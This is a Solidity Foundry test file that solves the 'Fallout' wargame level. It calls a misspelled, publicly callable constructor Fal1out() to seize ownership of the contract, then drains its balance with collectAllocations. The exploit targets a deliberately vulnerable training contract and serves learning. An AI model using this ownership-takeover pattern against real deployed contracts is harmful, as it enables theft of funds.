pragma solidity >=0.6.0 <0.9.0;
import "forge-std/Test.sol";
import {Fallout} from "../src/02-fallout.sol";

// function name wrong, everyone can call Fal1out()
contract Fallout02Test is Test {
    Fallout fout;

    function setUp() public {
        emit log_string("🧪 Setup Fallout...");
        address bob = mkaddr("bob");
        vm.prank(bob);
        fout = new Fallout();
    }

    function testFallout() public {
        emit log_string("🧪 Cracking Fallout...");
        address alice = mkaddr("alice");
        vm.deal(alice, 100 ether);
        vm.startPrank(alice);
        // fout.Fal1out{value: 1 ether}(); // for solidity version v0.8.0
        fout.Fal1out.value(1000_000_000)(); // for solidity version v0.6.0
        fout.collectAllocations();
        vm.stopPrank();
        emit log_named_address("Owner change to: ", fout.owner());
    }

    // @notice function to create address, and label it
    function mkaddr(string memory name) public returns (address) {
        address addr = address(
            uint160(uint256(keccak256(abi.encodePacked(name))))
        );
        vm.label(addr, name);
        return addr;
    }
}
